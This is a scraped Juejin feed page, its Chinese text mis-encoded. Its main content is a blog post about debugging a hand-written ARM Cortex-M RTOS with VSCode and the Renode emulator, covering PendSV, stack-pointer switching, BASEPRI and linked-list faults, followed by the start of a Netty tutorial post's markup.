            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1259367703787244/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·938559462475
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:43:04.000Z" title="Mon Dec 08 2025 04:43:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘ä¹‹å‰æ­å»ºäº†VSCode+Renodeçš„å¼€å‘ç¯å¢ƒåå¹¶æµ‹è¯•äº†ä¸€äº›ç®€å•çš„Led_Toggleç¤ºä¾‹ï¼Œåé¢æ‰“ç®—ç”¨å®ƒæ¥å¼€å‘ä¸€äº›å¤æ‚çš„åŠŸèƒ½ï¼Œæ¯”å¦‚RTOSçš„å®ç°ã€‚</p>
<p>ä¹‹åæˆ‘ç”¨ä¸¤å‘¨çš„æ—¶é—´å®ç°äº†ä¸€ä¸ªç®€å•çš„RTOSæ¨¡å‹ï¼Œä¸»è¦çš„ç›®çš„ï¼šç†Ÿæ‚‰ä½¿ç”¨ <strong>VSCode + Renode</strong> çš„å¼€å‘æ–¹å¼å’ŒåŠ å¼ºå¯¹RTOSçš„äº†è§£ã€‚ è¿™ä¸€æ¬¡å°è¯•ï¼Œè®©æˆ‘ç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°ï¼š</p>
<blockquote>
<p><strong>è°ƒè¯• RTOS ä¸ä¸€å®šéœ€è¦å¼€å‘æ¿ã€‚</strong> <strong>VSCode + Renode å¯ä»¥æŠŠåµŒå…¥å¼ç³»ç»Ÿè°ƒè¯•å˜å¾—åƒåº”ç”¨å±‚è½¯ä»¶ä¸€æ ·ä¸æ»‘ã€‚</strong></p>
</blockquote>
<p>æˆ‘æˆåŠŸåœ¨ Renode ä¸Šï¼š</p>
<ul>
<li>å•æ­¥è¿›å…¥ PendSV</li>
<li>è§‚å¯Ÿä»»åŠ¡åˆ‡æ¢å…¨è¿‡ç¨‹</li>
<li>åˆ†æ PSP/MSP çš„åˆ‡æ¢</li>
<li>æŸ¥å‡ºé“¾è¡¨æ’å…¥é”™è¯¯å¯¼è‡´çš„ UsageFault</li>
<li>å®šä½ BASEPRI è®¾ç½®ä¸å½“å¯¼è‡´çš„æ–­è¨€</li>
<li>å¤ç° pxIndex é”™è¯¯å¯¼è‡´çš„ä»»åŠ¡è°ƒåº¦æ··ä¹±</li>
</ul>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„ç»éªŒåˆ†äº« + å›¾ç¤ºï¼Œå¸®åŠ©ä½ ä¹Ÿèƒ½å¿«é€Ÿæ­å»ºè¿™å¥—â€œç°ä»£åŒ–åµŒå…¥å¼è°ƒè¯•ç¯å¢ƒâ€ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F11cookies11%2FRtosOfArm.git" target="_blank" title="https://github.com/11cookies11/RtosOfArm.git" ref="nofollow noopener noreferrer">é¡¹ç›®æºç (RTOSOfArm)</a></p>
<h2 data-id="heading-0">1. ä¸ºä»€ä¹ˆç”¨ VSCode + Renode è°ƒ RTOSï¼Ÿ</h2>
<h3 data-id="heading-1">âœ” å®Œå…¨ä¸ä¾èµ–ç¡¬ä»¶</h3>
<p>å®Œå…¨è½¯ä»¶åŒ–ï¼Œæ‰€æœ‰è¡Œä¸ºå¯å¤ç°ï¼Œè°ƒåº¦è¿‡ç¨‹å¯å•æ­¥ã€‚</p>
<h3 data-id="heading-2">âœ” è°ƒ RTOS ç‰¹åˆ«åˆé€‚</h3>
<ul>
<li>æŸ¥çœ‹ PendSV</li>
<li>æŸ¥çœ‹ PSP/MSP</li>
<li>æŸ¥çœ‹ BASEPRI</li>
<li>æŸ¥çœ‹é“¾è¡¨ç»“æ„</li>
<li>æŸ¥çœ‹å¼‚å¸¸å †æ ˆ</li>
<li>è·Ÿè¸ª SVC è°ƒåº¦ è¿™äº›åœ¨çœŸå®ç¡¬ä»¶ä¸Šè°ƒèµ·æ¥éå¸¸ç—›è‹¦ã€‚</li>
</ul>
<h3 data-id="heading-3">âœ” å¯é‡å¤ã€å¯å›æ”¾</h3>
<p>åŒæ ·çš„ ELF æ¯æ¬¡éƒ½èƒ½å¤ç°åŒæ ·çš„ bugï¼Œä¸åƒç¡¬ä»¶é‚£æ ·å—å¤–ç•Œå¹²æ‰°ã€‚</p>
<h2 data-id="heading-4">2. å·¥ç¨‹ç»“æ„ç¤ºæ„å›¾</h2>
<ul>
<li>æ ¹ç›®å½•</li>
<li>apps/</li>
<li>blinky/ï¼šæ¼”ç¤ºä»»åŠ¡ï¼ŒTask1/Task2 äº¤æ›¿æ‰“å°ä¸²å£ï¼ŒéªŒè¯ tick ä¸è°ƒåº¦</li>
<li>ports/</li>
<li>arm-cortex-m/ï¼šä¸Šä¸‹æ–‡åˆ‡æ¢ã€SysTickã€PendSV é…ç½®</li>
<li>rtos/ï¼ˆå­æ¨¡å—ï¼‰</li>
<li>config/ï¼šRTOS é…ç½®</li>
<li>source/ï¼šä»»åŠ¡ã€é“¾è¡¨ã€ä¸´ç•ŒåŒºåŸºç¡€è®¾æ–½</li>
<li>renode/</li>
<li>platform.rescï¼šRenode å¹³å°æè¿°ï¼ŒåŒ…å« GDB æœåŠ¡å™¨ç«¯å£</li>
<li>.vscode/</li>
<li>tasks.json / launch.jsonï¼šæ„å»ºã€ä¼ è¾“ã€å¯åŠ¨ Renodeã€GDB è¿æ¥çš„ä¸€é”®é“¾è·¯</li>
</ul>
<h2 data-id="heading-5">3. VSCode + Renode è°ƒè¯•æµç¨‹ç¤ºæ„</h2>
<p>ä¸‹é¢è¿™å¹…å›¾å¯ä»¥å¸®åŠ©ä½ ç†è§£æ•´ä¸ªæµç¨‹ï¼š</p>
<p>æµç¨‹éå¸¸é¡ºæ»‘ï¼š</p>
<ol>
<li>VSCode è°ƒç”¨ CMake ç”Ÿæˆ firmware.elf</li>
<li>è‡ªåŠ¨è¿è¡Œ Renodeï¼ˆå¯åŠ¨ CPUã€å¤–è®¾ã€å†…å­˜ï¼‰</li>
<li>Renode æ‰“å¼€ GDB Server</li>
<li>VSCode è‡ªåŠ¨ attach åˆ° 3333</li>
<li>ç¨‹åºåœåœ¨ Reset_Handler</li>
<li>ä½ å°±å¯ä»¥å¼€å§‹å•æ­¥è°ƒåº¦å™¨äº†</li>
</ol>
<p>å°±æ˜¯è¿™ä¹ˆâ€œç°ä»£â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f530313d9afe41c2befb4f10ce3fd5e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTM4NTU5NDYyNDc1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765773783&amp;x-signature=g0HWMHeMf%2BYCWfw3n7yzdW1oEv0%3D" alt="ssh_renode.jpg" loading="lazy"/></p>
<h2 data-id="heading-6">4. RTOS è°ƒè¯•ä¸­æœ€å…³é”®çš„å‡ ä¸ªå›¾ç¤º</h2>
<p>ä¸ºäº†è®©å†…å®¹æ›´ç›´è§‚ï¼Œç»“åˆæˆ‘è°ƒè¯•æ—¶çœŸæ­£é‡åˆ°çš„é—®é¢˜ï¼Œæ•´ç†å‡ºäº†å‡ ä¸ªé—®é¢˜å’Œä½¿ç”¨renodeè§£å†³é—®é¢˜çš„ä»‹ç»ã€‚</p>
<h2 data-id="heading-7">4.1 PendSV ä»»åŠ¡åˆ‡æ¢ï¼ˆé‡ç‚¹ï¼‰</h2>
<p>PendSV æ˜¯ RTOS è°ƒåº¦çš„æ ¸å¿ƒï¼ŒRenode å…è®¸æˆ‘ï¼š</p>
<ul>
<li>å•æ­¥è¿›å…¥ PendSV</li>
<li>çœ‹æ¯æ¡æŒ‡ä»¤</li>
<li>çœ‹å¯„å­˜å™¨å‹æ ˆ/å‡ºæ ˆ</li>
<li>çœ‹ PSP/MSP åˆ‡æ¢</li>
<li>çœ‹ç¬¬ä¸€ä¸ªä»»åŠ¡å¦‚ä½•å¯åŠ¨</li>
</ul>
<p>å®æœºå¾ˆéš¾åšåˆ°å¦‚æ­¤æ¸…æ™°ã€‚ æˆ‘åœ¨æ˜¯ä½¿ç”¨PendSVCå®ç°ä¸Šä¸‹æ–‡ä¿å­˜å’Œæ ˆåˆ‡æ¢çš„æ—¶å€™ï¼Œç”±äºä»£ç ä¸­è®¿é—®é”™äº†å¯„å­˜å™¨åœ°å€ï¼Œåœ¨é”™è¯¯æ—¶åº(rtosåˆå§‹åŒ–è¿˜æ²¡æœ‰å®Œæˆ)çš„æ—¶å€™è§¦å‘äº†PendSVCï¼Œå¯¼è‡´ä»PendSVCä¸­è¿”å›çš„æ—¶å€™ï¼Œå¾€PSPä¸­å¤åˆ¶äº†é”™è¯¯çš„ä¿¡æ¯ï¼Œç³»ç»Ÿè·‘é£ã€‚<strong>ç¡¬ä»¶å®æœºå¾ˆéš¾å‡†ç¡®æ•æ‰åˆ°é”™è¯¯è§¦å‘æ—¶åˆ»çš„ä¸Šä¸‹æ–‡</strong>ï¼Œä½†é€šè¿‡renodeï¼Œæˆ‘<strong>å¯ä»¥å‡†ç¡®çš„å‡†ç¡®å¤ç°é—®é¢˜ï¼Œå¹¶é€šè¿‡å†…æ ¸å¯„å­˜å™¨é€æ­¥æ‰¾åˆ°é—®é¢˜æ‰€åœ¨</strong>ï¼›</p>
<h2 data-id="heading-8">4.2 Cortex-M ä»»åŠ¡åˆ‡æ¢å †æ ˆ</h2>
<p>Cortex-M çš„æ ‡å‡†å¼‚å¸¸å †æ ˆæ„æˆæ˜¯ï¼š</p>
<ul>
<li>xPSR</li>
<li>PC</li>
<li>LR</li>
<li>R12</li>
<li>R3/R2/R1/R0</li>
<li>ä»¥åŠ PendSV è‡ªå·±ä¿å­˜çš„ R4â€“R11</li>
</ul>
<p>Renode çš„å¯„å­˜å™¨çª—å£èƒ½é€æ¡éªŒè¯ï¼š â€œæˆ‘ä¿å­˜/æ¢å¤çš„é¡ºåºå¯¹ä¸å¯¹ï¼Ÿâ€ â€œæˆ‘çš„ PSP æ˜¯å¦æ­£ç¡®æŒ‡å‘ä»»åŠ¡æ ˆï¼Ÿâ€</p>
<p>è¿™äº›ä»¥å‰éƒ½æ˜¯é çŒœï¼Œç°åœ¨èƒ½çœŸæ­£çœ‹åˆ°ã€‚</p>
<p>æ›´åŠ <strong>æœ‰åˆ©äºç†è§£RTOSä¸­ä¸Šä¸‹æ–‡çš„ä¿å­˜çš„å®ç°</strong>ï¼›</p>
<p>æˆ‘åœ¨å®ç°å †æ ˆåˆ‡æ¢çš„æ—¶å€™ï¼Œä½¿ç”¨çš„è£¸å‡½æ•°å…³é”®å­—ï¼Œå…¶ä¸­æœ‰åœ¨è®¾ç½®PSPçš„æ—¶å€™ï¼Œé”™è¯¯çš„è®¾ç½®æˆäº†MSPï¼Œå¯¼è‡´è¿”å›Thread Modeçš„æ—¶å€™ï¼Œç³»ç»Ÿå‡ºç°å¼‚å¸¸ï¼Œä½¿ç”¨Renodeå¯ä»¥å¾ˆæ¸…æ™°å¤ç°å’Œå¯æ§é—®é¢˜ï¼›</p>
<h2 data-id="heading-9">4.3 FreeRTOS/ä¹¦ä¸Š RTOS ä½¿ç”¨çš„é“¾è¡¨ç»“æ„</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4feb2a32015c429997934583ea8e294c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTM4NTU5NDYyNDc1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765773783&amp;x-signature=otWQ6ovHCSKtKfwzuEwXm0yNfBM%3D" alt="é“¾è¡¨.jpg" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>æˆ‘è°ƒè¯•æ—¶é‡åˆ°è¿‡ä¸¤ä¸ªå…¸å‹é—®é¢˜ï¼š</p>
<ul>
<li>pxIndex æ¨è¿›é”™è¯¯</li>
<li>pxNext æŒ‡å‘éæ³•åœ°å€å¯¼è‡´ UsageFault</li>
</ul>
<p>ä½¿ç”¨renodeåï¼Œæˆ‘èƒ½å¾ˆå¥½åœ°åœ¨ GDB é‡Œçœ‹åˆ°çš„ pxNext, pxPrevious, pxIndexã€‚</p>
<h2 data-id="heading-10">5. è°ƒè¯•æ—¶æˆ‘é‡åˆ°çš„å…³é”®é—®é¢˜ï¼ˆé™„å›¾ç¤ºç†è§£ï¼‰</h2>
<h2 data-id="heading-11">ğŸ§¨ 5.1 vListInsert å‡ºç° UsageFault</h2>
<pre><code class="hljs language-ini" lang="ini">for (<span class="hljs-attr">pxIterator</span> = &amp;pxList-&gt;xListEnd<span class="hljs-comment">;</span>
     pxIterator-&gt;pxNext-&gt;itemValue &lt;= pxNewListItem-&gt;itemValue<span class="hljs-comment">;</span>
     <span class="hljs-attr">pxIterator</span> = pxIterator-&gt;pxNext)
{
}
</code></pre>
<p>ç”±äºé“¾è¡¨åˆå§‹åŒ–ä¸å®Œæ•´ï¼š</p>
<ul>
<li>pxIterator-&gt;pxNext = 0xFFFFFFFFï¼Œå¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œ</li>
<li>ä¸€äº›é‡æŒ‡é’ˆè¢«å¼•ç”¨æ—¶ç›´æ¥è§¦å‘ UsageFault</li>
</ul>
<p>ç”¨ Renode å•æ­¥åï¼Œæˆ‘èƒ½çœ‹åˆ° EXACTLY å“ªä¸€æ¡æ±‡ç¼–æŒ‡ä»¤è®¿é—®äº†éæ³•åœ°å€ã€‚</p>
<h2 data-id="heading-12">ğŸ§¨ 5.2 BASEPRI è®¾ç½®ä¸å½“å¯¼è‡´ configASSERT æŠ¥é”™</h2>
<p>ç—‡çŠ¶ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">configASSERT</span>( (IPSCR &amp; <span class="hljs-number">0</span>xFF) == <span class="hljs-number">0</span> )
</code></pre>
<p>è¡¨ç¤ºè¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œä»»åŠ¡å¤„äºå¼‚å¸¸çŠ¶æ€ã€‚</p>
<p>æœ€ç»ˆæˆ‘å‘ç°ï¼š</p>
<ul>
<li>ä¸´ç•ŒåŒºåµŒå¥—è®¡æ•°é”™è¯¯</li>
<li>BASEPRI è®¾ç½®æ¯”é¢„æœŸæ›´é«˜</li>
<li>é˜»æ–­äº†æœ¬åº”è§¦å‘çš„ SVC</li>
<li>å¯¼è‡´è°ƒåº¦å™¨è¿›å…¥é”™è¯¯çŠ¶æ€</li>
</ul>
<p>è¿™ä¸€ç±»é”™è¯¯é æ™®é€šè°ƒè¯•å™¨å¾ˆéš¾æŠ“ä½ï¼ŒRenode é€šè¿‡ä¸­æ–­äº‹ä»¶å¯ä»¥æ¸…æ™°çœ‹åˆ°ä¼˜å…ˆçº§å˜åŒ–ã€‚</p>
<h2 data-id="heading-13">ğŸ§¨ 5.3 pxIndex æŒ‡å‘é”™è¯¯å¯¼è‡´ä»»åŠ¡åˆ‡æ¢æ··ä¹±</h2>
<p>ç—‡çŠ¶ï¼š</p>
<ul>
<li>å½“å‰ä»»åŠ¡ TCB é”™ä¹±</li>
<li>listGET_OWNER_OF_HEAD_ENTRY è¿”å›é”™è¯¯åœ°å€</li>
<li>PendSV æ¢å¤æ ˆæ—¶è·³åˆ°é”™è¯¯ PC</li>
</ul>
<p>é“¾è¡¨ç»“æ„å›¾å†æ¬¡æä¾›å¸®åŠ©ï¼š</p>
<p>é€šè¿‡ Renode å•æ­¥ï¼Œæˆ‘èƒ½ä»ï¼š</p>
<pre><code class="hljs">pxIndex â†’ pxNext â†’ pvOwner
</code></pre>
<p>ä¸€è·¯çœ‹åˆ°é“¾è¡¨çš„çœŸå®ç»“æ„ï¼Œä»è€Œç¡®è®¤å“ªä¸ªèŠ‚ç‚¹è¢«ç ´åã€‚</p>
<h2 data-id="heading-14">6. Renode è°ƒ RTOS çš„å‡ ä¸ªå¼ºçƒˆæ¨èæŠ€å·§ï¼ˆé…å›¾ï¼‰</h2>
<h3 data-id="heading-15">â‘  æŸ¥çœ‹ CPU å¯„å­˜å™¨</h3>
<pre><code class="hljs">cpu DumpRegisters
 
</code></pre>
<p>å°¤å…¶æ˜¯ PSP/MSP/CONTROLï¼Œå¾ˆå…³é”®ã€‚</p>
<h3 data-id="heading-16">â‘¡ æŸ¥çœ‹å¤–è®¾ï¼ˆæ¯”å¦‚ SysTick å¯„å­˜å™¨ï¼‰</h3>
<p>ä½ ä¹‹å‰ Systick ENABLE ä½å†™é”™ï¼Œè¿™ä¸ªå›¾èƒ½å¸®åŠ©ç†è§£æ§åˆ¶ä½çš„å«ä¹‰ã€‚</p>
<h3 data-id="heading-17">â‘¢ æŸ¥çœ‹ä¸­æ–­äº‹ä»¶é¡ºåº</h3>
<p>å¯ä»¥çœ‹åˆ°ï¼š</p>
<ul>
<li>SVC</li>
<li>SysTick</li>
<li>PendSV</li>
</ul>
<p>çš„è°ƒç”¨é¡ºåºï¼ˆéå¸¸æœ‰ç”¨ï¼‰ã€‚</p>
<h2 data-id="heading-18">7. ç°ä»£åŒ–åµŒå…¥å¼å¼€å‘çš„æ„Ÿæ‚Ÿ</h2>
<p>é€šè¿‡è¿™æ¬¡ä½“éªŒï¼Œæˆ‘çœŸæ­£æ„Ÿå—åˆ°ï¼š</p>
<blockquote>
<p><strong>åµŒå…¥å¼å®Œå…¨å¯ä»¥å˜å¾—â€œç°ä»£â€è€Œä¸æ˜¯â€œæŠ˜ç£¨â€ã€‚</strong></p>
</blockquote>
<ul>
<li>ä¸éœ€è¦åå¤çƒ§å½•</li>
<li>ä¸ä¾èµ–ç¡¬ä»¶</li>
<li>ä¸é ä¸²å£</li>
<li>ä¸é  J-Link</li>
<li>æ‰€æœ‰é—®é¢˜éƒ½å¯é‡å¤å¤ç°</li>
<li>æ‰€æœ‰ç»“æ„éƒ½èƒ½åœ¨ Renode ä¸­å•æ­¥è§‚å¯Ÿ</li>
<li>ä»»æ„å¼‚å¸¸éƒ½èƒ½å®šä½</li>
<li>å·¥ç¨‹ç»“æ„æ¸…æ™°</li>
<li>è°ƒè¯•ä½“éªŒæ¯” IAR/Keil å¥½å¤ªå¤š</li>
</ul>
<p>è¿™ç§æ„Ÿè§‰çœŸçš„å¾ˆçˆ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[039_Nettyç½‘ç»œç¼–ç¨‹æœåŠ¡ç«¯å…¥é—¨ç¨‹åºå¼€å‘]]></title>    <link>https://juejin.cn/post/7581025279645483046</link>    <guid>https://juejin.cn/post/7581025279645483046</guid>    <pubDate>2025-12-08T04:32:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645483046" data-draft-id="7581004702945345563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="039_Nettyç½‘ç»œç¼–ç¨‹æœåŠ¡ç«¯å…¥é—¨ç¨‹åºå¼€å‘"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:32:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Frank_zhou"/> <meta itemprop="url" content="https://juejin.cn/user/634850088593675"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            039_Nettyç½‘ç»œç¼–ç¨‹æœåŠ¡ç«¯å…¥é—¨ç¨‹åºå¼€å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/634850088593675/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Frank_zhou
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.1 åˆå­¦ä¹ç»ƒ
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.1 åˆå­¦ä¹ç»ƒ" title="VIP.1 åˆå­¦ä¹ç»ƒ" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:32:00.000Z" title="Mon Dec 08 2025 04:32:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 